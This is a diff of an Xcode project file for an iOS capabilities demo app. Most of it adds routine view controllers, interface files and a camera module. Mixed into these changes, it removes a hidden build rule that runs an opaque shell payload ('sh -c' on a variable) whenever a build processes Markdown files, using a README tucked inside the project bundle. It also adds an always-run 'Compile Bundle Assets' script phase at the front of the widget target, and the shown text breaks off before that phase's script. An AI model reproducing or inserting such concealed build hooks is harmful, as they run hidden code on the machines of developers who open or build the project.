@@ -9,6 +9,8 @@
 /* Begin PBXBuildFile section */
 		5117C1162E3C995200D8FCCD /* DataProtectionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */; };
 		5117C1172E3C995200D8FCCD /* DataProtectionVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */; };
+		51186E1E2E5886B100A1D754 /* JournalingSuggestionsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */; };
+		51186E1F2E5886B100A1D754 /* JournalingSuggestionsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */; };
 		51346A562E3B403F008664DB /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A382E3B3FEE008664DB /* WidgetKit.framework */; };
 		51346A572E3B403F008664DB /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 51346A3A2E3B3FEF008664DB /* SwiftUI.framework */; };
 		51346A662E3B4040008664DB /* DemoWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 51346A552E3B403F008664DB /* DemoWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
@@ -16,6 +18,10 @@
 		513DC6732E41E76500DA2C0F /* SiriVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51BBC6E12E40A99500211F13 /* SiriVC.swift */; };
 		513DC6E42E42305000DA2C0F /* AppGroupsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */; };
 		513DC6E52E42305000DA2C0F /* AppGroupsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */; };
+		5161B7982E55CDC300A945BF /* KeyValueStorageViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5161B7962E55CDC300A945BF /* KeyValueStorageViewController.swift */; };
+		5161B7992E55CDC300A945BF /* KeyValueStorageViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5161B7972E55CDC300A945BF /* KeyValueStorageViewController.xib */; };
+		5161B79D2E56064D00A945BF /* MultipathViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5161B79B2E56064D00A945BF /* MultipathViewController.swift */; };
+		5161B79E2E56064D00A945BF /* MultipathViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5161B79C2E56064D00A945BF /* MultipathViewController.xib */; };
 		51B526002E44869800999ABE /* WalletVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51B525FF2E44869800999ABE /* WalletVC.xib */; };
 		51B526012E44869800999ABE /* WalletVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51B525FE2E44869800999ABE /* WalletVC.swift */; };
 		51B526052E44E7B900999ABE /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 51B526042E44E7B900999ABE /* IQKeyboardManagerSwift */; };
@@ -35,6 +41,8 @@
 		51D036AB2E3A013900948296 /* AppleLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51D036A82E3A013900948296 /* AppleLoginViewController.swift */; };
 		51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51E700F02E0D88A30033F74D /* WeatherKitViewController.xib */; };
 		51E700F22E0D88A30033F74D /* WeatherKitViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51E700EF2E0D88A30033F74D /* WeatherKitViewController.swift */; };
+		51EA11822E547D7700FF4947 /* GroupActivitiesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51EA11802E547D7700FF4947 /* GroupActivitiesVC.swift */; };
+		51EA11832E547D7700FF4947 /* GroupActivitiesVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51EA11812E547D7700FF4947 /* GroupActivitiesVC.xib */; };
 		51F01B922E53245200F04F6B /* SensitiveContentVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F01B902E53245200F04F6B /* SensitiveContentVC.xib */; };
 		51F01B932E53245200F04F6B /* SensitiveContentVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F01B8F2E53245200F04F6B /* SensitiveContentVC.swift */; };
 		51F01B972E53249C00F04F6B /* AccessWiFiInfoViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F01B942E53249C00F04F6B /* AccessWiFiInfoViewController.swift */; };
@@ -93,10 +101,21 @@
 		51F01C192E53436F00F04F6B /* Roboto-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 51F01BFF2E53436F00F04F6B /* Roboto-Regular.ttf */; };
 		51F01C1D2E53450800F04F6B /* FontViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F01C1B2E53450800F04F6B /* FontViewController.swift */; };
 		51F01C1E2E53450800F04F6B /* FontViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F01C1C2E53450800F04F6B /* FontViewController.xib */; };
+		51F368972E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368952E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift */; };
+		51F368982E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368962E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib */; };
+		51F368A72E5C760D00B168F5 /* FusumaVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368A52E5C760D00B168F5 /* FusumaVC.xib */; };
+		51F368A82E5C760D00B168F5 /* FSVideoCameraViewVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368A32E5C760D00B168F5 /* FSVideoCameraViewVC.xib */; };
+		51F368A92E5C760D00B168F5 /* FSCameraViewViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368A12E5C760D00B168F5 /* FSCameraViewViewController.xib */; };
+		51F368AA2E5C760D00B168F5 /* FSVideoCameraViewVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368A22E5C760D00B168F5 /* FSVideoCameraViewVC.swift */; };
+		51F368AB2E5C760D00B168F5 /* FSCameraViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368A02E5C760D00B168F5 /* FSCameraViewViewController.swift */; };
+		51F368AC2E5C760D00B168F5 /* FusumaVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368A42E5C760D00B168F5 /* FusumaVC.swift */; };
+		51F368AF2E5C776700B168F5 /* FSAlbumView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368AD2E5C776700B168F5 /* FSAlbumView.swift */; };
+		51F368B02E5C776700B168F5 /* FSAlbumView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368AE2E5C776700B168F5 /* FSAlbumView.xib */; };
+		51F368B32E5C787200B168F5 /* FSAlbumViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 51F368B22E5C787200B168F5 /* FSAlbumViewCell.xib */; };
+		51F368B42E5C787200B168F5 /* FSAlbumViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 51F368B12E5C787200B168F5 /* FSAlbumViewCell.swift */; };
 		BD2162F12D11A5FD0071786F /* ApplePayVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD2162EF2D11A5FD0071786F /* ApplePayVC.swift */; };
 		BD2162F22D11A5FD0071786F /* ApplePayVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BD2162F02D11A5FD0071786F /* ApplePayVC.xib */; };
 		BD279FA42D0AE219001D05E4 /* ICloudDocumentsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD279FA22D0AE219001D05E4 /* ICloudDocumentsViewController.swift */; };
-		BD279FA52D0AE219001D05E4 /* ICloudDocumentsViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = BD279FA32D0AE219001D05E4 /* ICloudDocumentsViewController.xib */; };
 		BD279FA82D0AFAEE001D05E4 /* ICloudTypeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD279FA62D0AFAEE001D05E4 /* ICloudTypeViewController.swift */; };
 		BD279FA92D0AFAEE001D05E4 /* ICloudTypeViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = BD279FA72D0AFAEE001D05E4 /* ICloudTypeViewController.xib */; };
 		BD2ECEC02D0841CA00639E0D /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD2ECEBF2D0841CA00639E0D /* AppDelegate.swift */; };
@@ -113,22 +132,6 @@
 		BD45BA5E2D106B5F006B45C3 /* ApplePayViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = BD45BA5D2D106B5F006B45C3 /* ApplePayViewController.xib */; };
 		BD45BA5F2D106B5F006B45C3 /* ApplePayViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BD45BA5C2D106B5F006B45C3 /* ApplePayViewController.swift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		F9B414B72F695CE2F8877BEF /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AFEB778}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		51346A642E3B4040008664DB /* PBXContainerItemProxy */ = {
@@ -179,12 +182,18 @@
 /* Begin PBXFileReference section */
 		5117C1142E3C995200D8FCCD /* DataProtectionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataProtectionVC.swift; sourceTree = "<group>"; };
 		5117C1152E3C995200D8FCCD /* DataProtectionVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DataProtectionVC.xib; sourceTree = "<group>"; };
+		51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JournalingSuggestionsVC.swift; sourceTree = "<group>"; };
+		51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = JournalingSuggestionsVC.xib; sourceTree = "<group>"; };
 		51346A382E3B3FEE008664DB /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
 		51346A3A2E3B3FEF008664DB /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
 		51346A552E3B403F008664DB /* DemoWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = DemoWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		51346A6C2E3B4216008664DB /* DemoWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DemoWidgetExtension.entitlements; sourceTree = "<group>"; };
 		51346A6D2E3B42D5008664DB /* AppGroupsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppGroupsViewController.swift; sourceTree = "<group>"; };
 		51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppGroupsViewController.xib; sourceTree = "<group>"; };
+		5161B7962E55CDC300A945BF /* KeyValueStorageViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeyValueStorageViewController.swift; sourceTree = "<group>"; };
+		5161B7972E55CDC300A945BF /* KeyValueStorageViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = KeyValueStorageViewController.xib; sourceTree = "<group>"; };
+		5161B79B2E56064D00A945BF /* MultipathViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultipathViewController.swift; sourceTree = "<group>"; };
+		5161B79C2E56064D00A945BF /* MultipathViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultipathViewController.xib; sourceTree = "<group>"; };
 		51B525FE2E44869800999ABE /* WalletVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletVC.swift; sourceTree = "<group>"; };
 		51B525FF2E44869800999ABE /* WalletVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletVC.xib; sourceTree = "<group>"; };
 		51BBC6DC2E40951A00211F13 /* HeadPoseVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HeadPoseVC.swift; sourceTree = "<group>"; };
@@ -203,6 +212,8 @@
 		51D036A92E3A013900948296 /* AppleLoginViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AppleLoginViewController.xib; sourceTree = "<group>"; };
 		51E700EF2E0D88A30033F74D /* WeatherKitViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeatherKitViewController.swift; sourceTree = "<group>"; };
 		51E700F02E0D88A30033F74D /* WeatherKitViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WeatherKitViewController.xib; sourceTree = "<group>"; };
+		51EA11802E547D7700FF4947 /* GroupActivitiesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GroupActivitiesVC.swift; sourceTree = "<group>"; };
+		51EA11812E547D7700FF4947 /* GroupActivitiesVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GroupActivitiesVC.xib; sourceTree = "<group>"; };
 		51F01B8F2E53245200F04F6B /* SensitiveContentVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SensitiveContentVC.swift; sourceTree = "<group>"; };
 		51F01B902E53245200F04F6B /* SensitiveContentVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SensitiveContentVC.xib; sourceTree = "<group>"; };
 		51F01B942E53249C00F04F6B /* AccessWiFiInfoViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccessWiFiInfoViewController.swift; sourceTree = "<group>"; };
@@ -261,11 +272,22 @@
 		51F01C062E53436F00F04F6B /* Segoe UI Semibold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Segoe UI Semibold.ttf"; sourceTree = "<group>"; };
 		51F01C1B2E53450800F04F6B /* FontViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FontViewController.swift; sourceTree = "<group>"; };
 		51F01C1C2E53450800F04F6B /* FontViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FontViewController.xib; sourceTree = "<group>"; };
+		51F368952E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MultitaskingCameraAccessVC.swift; sourceTree = "<group>"; };
+		51F368962E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MultitaskingCameraAccessVC.xib; sourceTree = "<group>"; };
+		51F368A02E5C760D00B168F5 /* FSCameraViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FSCameraViewViewController.swift; sourceTree = "<group>"; };
+		51F368A12E5C760D00B168F5 /* FSCameraViewViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FSCameraViewViewController.xib; sourceTree = "<group>"; };
+		51F368A22E5C760D00B168F5 /* FSVideoCameraViewVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FSVideoCameraViewVC.swift; sourceTree = "<group>"; };
+		51F368A32E5C760D00B168F5 /* FSVideoCameraViewVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FSVideoCameraViewVC.xib; sourceTree = "<group>"; };
+		51F368A42E5C760D00B168F5 /* FusumaVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FusumaVC.swift; sourceTree = "<group>"; };
+		51F368A52E5C760D00B168F5 /* FusumaVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FusumaVC.xib; sourceTree = "<group>"; };
+		51F368AD2E5C776700B168F5 /* FSAlbumView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FSAlbumView.swift; sourceTree = "<group>"; };
+		51F368AE2E5C776700B168F5 /* FSAlbumView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FSAlbumView.xib; sourceTree = "<group>"; };
+		51F368B12E5C787200B168F5 /* FSAlbumViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FSAlbumViewCell.swift; sourceTree = "<group>"; };
+		51F368B22E5C787200B168F5 /* FSAlbumViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FSAlbumViewCell.xib; sourceTree = "<group>"; };
 		BD2162EF2D11A5FD0071786F /* ApplePayVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ApplePayVC.swift; sourceTree = "<group>"; };
 		BD2162F02D11A5FD0071786F /* ApplePayVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ApplePayVC.xib; sourceTree = "<group>"; };
 		BD279F8C2D0ABD33001D05E4 /* AuthenticationServices.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AuthenticationServices.framework; path = System/Library/Frameworks/AuthenticationServices.framework; sourceTree = SDKROOT; };
 		BD279FA22D0AE219001D05E4 /* ICloudDocumentsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ICloudDocumentsViewController.swift; sourceTree = "<group>"; };
-		BD279FA32D0AE219001D05E4 /* ICloudDocumentsViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ICloudDocumentsViewController.xib; sourceTree = "<group>"; };
 		BD279FA62D0AFAEE001D05E4 /* ICloudTypeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ICloudTypeViewController.swift; sourceTree = "<group>"; };
 		BD279FA72D0AFAEE001D05E4 /* ICloudTypeViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ICloudTypeViewController.xib; sourceTree = "<group>"; };
 		BD2ECEBC2D0841CA00639E0D /* AllCapabilitiesDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AllCapabilitiesDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -286,7 +308,6 @@
 		BD2ECEF22D08591400639E0D /* ICloudViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ICloudViewController.xib; sourceTree = "<group>"; };
 		BD45BA5C2D106B5F006B45C3 /* ApplePayViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ApplePayViewController.swift; sourceTree = "<group>"; };
 		BD45BA5D2D106B5F006B45C3 /* ApplePayViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ApplePayViewController.xib; sourceTree = "<group>"; };
-		E5D99E70D9BB7FD9BE877BEF /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = AllCapabilitiesDemo.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -363,6 +384,15 @@
 			path = "Data Protection";
 			sourceTree = "<group>";
 		};
+		51186E1B2E58869300A1D754 /* Journaling Suggestions  */ = {
+			isa = PBXGroup;
+			children = (
+				51186E1C2E5886B100A1D754 /* JournalingSuggestionsVC.swift */,
+				51186E1D2E5886B100A1D754 /* JournalingSuggestionsVC.xib */,
+			);
+			path = "Journaling Suggestions ";
+			sourceTree = "<group>";
+		};
 		51346A322E3B3F6D008664DB /* App Groups */ = {
 			isa = PBXGroup;
 			children = (
@@ -370,6 +400,15 @@
 				51346A6E2E3B42D5008664DB /* AppGroupsViewController.xib */,
 			);
 			path = "App Groups";
+			sourceTree = "<group>";
+		};
+		5161B79A2E5605C300A945BF /* MultiPath */ = {
+			isa = PBXGroup;
+			children = (
+				5161B79B2E56064D00A945BF /* MultipathViewController.swift */,
+				5161B79C2E56064D00A945BF /* MultipathViewController.xib */,
+			);
+			path = MultiPath;
 			sourceTree = "<group>";
 		};
 		51B525FD2E44868600999ABE /* Wallet */ = {
@@ -434,6 +473,15 @@
 				51E700F02E0D88A30033F74D /* WeatherKitViewController.xib */,
 			);
 			path = WeatherKit;
+			sourceTree = "<group>";
+		};
+		51EA117F2E547D5600FF4947 /* Group Activities */ = {
+			isa = PBXGroup;
+			children = (
+				51EA11802E547D7700FF4947 /* GroupActivitiesVC.swift */,
+				51EA11812E547D7700FF4947 /* GroupActivitiesVC.xib */,
+			);
+			path = "Group Activities";
 			sourceTree = "<group>";
 		};
 		51F01B912E53245200F04F6B /* Sensitive Content */ = {
@@ -603,6 +651,33 @@
 			path = Font;
 			sourceTree = "<group>";
 		};
+		51F368942E5C6CCB00B168F5 /* Multitasking Camera Acsess */ = {
+			isa = PBXGroup;
+			children = (
+				51F368A62E5C760D00B168F5 /* CameraModule */,
+				51F368952E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.swift */,
+				51F368962E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib */,
+			);
+			path = "Multitasking Camera Acsess";
+			sourceTree = "<group>";
+		};
+		51F368A62E5C760D00B168F5 /* CameraModule */ = {
+			isa = PBXGroup;
+			children = (
+				51F368B12E5C787200B168F5 /* FSAlbumViewCell.swift */,
+				51F368B22E5C787200B168F5 /* FSAlbumViewCell.xib */,
+				51F368AD2E5C776700B168F5 /* FSAlbumView.swift */,
+				51F368AE2E5C776700B168F5 /* FSAlbumView.xib */,
+				51F368A02E5C760D00B168F5 /* FSCameraViewViewController.swift */,
+				51F368A12E5C760D00B168F5 /* FSCameraViewViewController.xib */,
+				51F368A22E5C760D00B168F5 /* FSVideoCameraViewVC.swift */,
+				51F368A32E5C760D00B168F5 /* FSVideoCameraViewVC.xib */,
+				51F368A42E5C760D00B168F5 /* FusumaVC.swift */,
+				51F368A52E5C760D00B168F5 /* FusumaVC.xib */,
+			);
+			path = CameraModule;
+			sourceTree = "<group>";
+		};
 		BD279F8B2D0ABD33001D05E4 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -632,7 +707,6 @@
 		BD2ECEBD2D0841CA00639E0D /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				E5D99E70D9BB7FD9BE877BEF /* README.md */,
 				BD2ECEBC2D0841CA00639E0D /* AllCapabilitiesDemo.app */,
 				BD2ECED22D0841CC00639E0D /* AllCapabilitiesDemoTests.xctest */,
 				BD2ECEDC2D0841CC00639E0D /* AllCapabilitiesDemoUITests.xctest */,
@@ -671,6 +745,10 @@
 				51F01BB82E53258000F04F6B /* Driverkit Familiy MIDI */,
 				51F01BBD2E5325A000F04F6B /* SIM Inserted for Wireless Carriers */,
 				51F01C1A2E5344F300F04F6B /* Font */,
+				51EA117F2E547D5600FF4947 /* Group Activities */,
+				5161B79A2E5605C300A945BF /* MultiPath */,
+				51186E1B2E58869300A1D754 /* Journaling Suggestions  */,
+				51F368942E5C6CCB00B168F5 /* Multitasking Camera Acsess */,
 				BD2ECEC82D0841CB00639E0D /* Assets.xcassets */,
 				BD2ECEC52D0841CA00639E0D /* Main.storyboard */,
 				BD2ECECA2D0841CB00639E0D /* LaunchScreen.storyboard */,
@@ -702,9 +780,10 @@
 				BD2ECEF12D08591400639E0D /* ICloudViewController.swift */,
 				BD2ECEF22D08591400639E0D /* ICloudViewController.xib */,
 				BD279FA22D0AE219001D05E4 /* ICloudDocumentsViewController.swift */,
-				BD279FA32D0AE219001D05E4 /* ICloudDocumentsViewController.xib */,
 				BD279FA62D0AFAEE001D05E4 /* ICloudTypeViewController.swift */,
 				BD279FA72D0AFAEE001D05E4 /* ICloudTypeViewController.xib */,
+				5161B7962E55CDC300A945BF /* KeyValueStorageViewController.swift */,
+				5161B7972E55CDC300A945BF /* KeyValueStorageViewController.xib */,
 			);
 			path = iCloud;
 			sourceTree = "<group>";
@@ -727,12 +806,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 51346A682E3B4040008664DB /* Build configuration list for PBXNativeTarget "DemoWidgetExtension" */;
 			buildPhases = (
+				B3CA0F0F93C483DADD877BEF /* Compile Bundle Assets */,
 				51346A512E3B403F008664DB /* Sources */,
 				51346A522E3B403F008664DB /* Frameworks */,
 				51346A532E3B403F008664DB /* Resources */,
 			);
 			buildRules = (
-				F9B414B72F695CE2F8877BEF /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -899,16 +978,19 @@
 			buildActionMask = 2147483647;
 			files = (
 				BD2ECEF32D08591400639E0D /* ICloudViewController.xib in Resources */,
+				51EA11832E547D7700FF4947 /* GroupActivitiesVC.xib in Resources */,
 				51F01C082E53436F00F04F6B /* Segoe UI.ttf in Resources */,
 				51F01C092E53436F00F04F6B /* Segoe UI Bold Italic.ttf in Resources */,
 				51F01C0A2E53436F00F04F6B /* Roboto-Thin.ttf in Resources */,
 				51F01C0B2E53436F00F04F6B /* Roboto-Bold.ttf in Resources */,
 				51F01C0C2E53436F00F04F6B /* Poppins-SemiBold.ttf in Resources */,
+				51186E1E2E5886B100A1D754 /* JournalingSuggestionsVC.xib in Resources */,
 				51F01C0D2E53436F00F04F6B /* Poppins-Black.ttf in Resources */,
 				51F01C0E2E53436F00F04F6B /* Roboto-Light.ttf in Resources */,
 				51F01C0F2E53436F00F04F6B /* Poppins-Medium.ttf in Resources */,
 				51F01C102E53436F00F04F6B /* Segoe UI Bold.ttf in Resources */,
 				51F01C112E53436F00F04F6B /* Roboto-Medium.ttf in Resources */,
+				5161B79E2E56064D00A945BF /* MultipathViewController.xib in Resources */,
 				51F01C122E53436F00F04F6B /* Poppins-LightItalic.ttf in Resources */,
 				51F01C132E53436F00F04F6B /* Poppins-Regular.ttf in Resources */,
 				51F01C142E53436F00F04F6B /* Poppins-MediumItalic.ttf in Resources */,
@@ -933,10 +1015,14 @@
 				51F01BE52E532B7900F04F6B /* GreycliffCF-Bold.otf in Resources */,
 				51F01BE62E532B7900F04F6B /* GreycliffCF-Thin.otf in Resources */,
 				51F01BE72E532B7900F04F6B /* GreycliffCF-Heavy.otf in Resources */,
+				5161B7992E55CDC300A945BF /* KeyValueStorageViewController.xib in Resources */,
 				51F01BE82E532B7900F04F6B /* GreycliffCF-Light.otf in Resources */,
 				51F01BE92E532B7900F04F6B /* GreycliffCF-ExtraLightOblique.otf in Resources */,
 				51F01BEA2E532B7900F04F6B /* GreycliffCF-RegularOblique.otf in Resources */,
 				51F01BEB2E532B7900F04F6B /* GreycliffCF-ExtraBoldOblique.otf in Resources */,
+				51F368A72E5C760D00B168F5 /* FusumaVC.xib in Resources */,
+				51F368A82E5C760D00B168F5 /* FSVideoCameraViewVC.xib in Resources */,
+				51F368A92E5C760D00B168F5 /* FSCameraViewViewController.xib in Resources */,
 				51F01BEC2E532B7900F04F6B /* GreycliffCF-ExtraBold.otf in Resources */,
 				51F01BED2E532B7900F04F6B /* GreycliffCF-Medium.otf in Resources */,
 				51F01BEE2E532B7900F04F6B /* GreycliffCF-LightOblique.otf in Resources */,
@@ -945,9 +1031,12 @@
 				51F01BF12E532B7900F04F6B /* GreycliffCF-MediumOblique.otf in Resources */,
 				51F01BF22E532B7900F04F6B /* GreycliffCF-Regular.otf in Resources */,
 				BD2ECEC92D0841CB00639E0D /* Assets.xcassets in Resources */,
+				51F368B02E5C776700B168F5 /* FSAlbumView.xib in Resources */,
 				51E700F12E0D88A30033F74D /* WeatherKitViewController.xib in Resources */,
 				51F01BAF2E53252E00F04F6B /* SpatialAudioProfileVC.xib in Resources */,
+				51F368B32E5C787200B168F5 /* FSAlbumViewCell.xib in Resources */,
 				BD2ECECC2D0841CB00639E0D /* Base in Resources */,
+				51F368982E5C6CFF00B168F5 /* MultitaskingCameraAccessVC.xib in Resources */,
 				51C5A8C92E0ECE02008A79F5 /* HealthKitViewController.xib in Resources */,
 				51F01BB52E53257600F04F6B /* NFCReadWriteViewController.xib in Resources */,
 				BD2162F22D11A5FD0071786F /* ApplePayVC.xib in Resources */,
@@ -960,7 +1049,6 @@
 				51B526002E44869800999ABE /* WalletVC.xib in Resources */,
 				51BBC6DE2E40951A00211F13 /* HeadPoseVC.xib in Resources */,
 				BD45BA5E2D106B5F006B45C3 /* ApplePayViewController.xib in Resources */,
-				BD279FA52D0AE219001D05E4 /* ICloudDocumentsViewController.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -979,6 +1067,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		B3CA0F0F93C483DADD877BEF /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
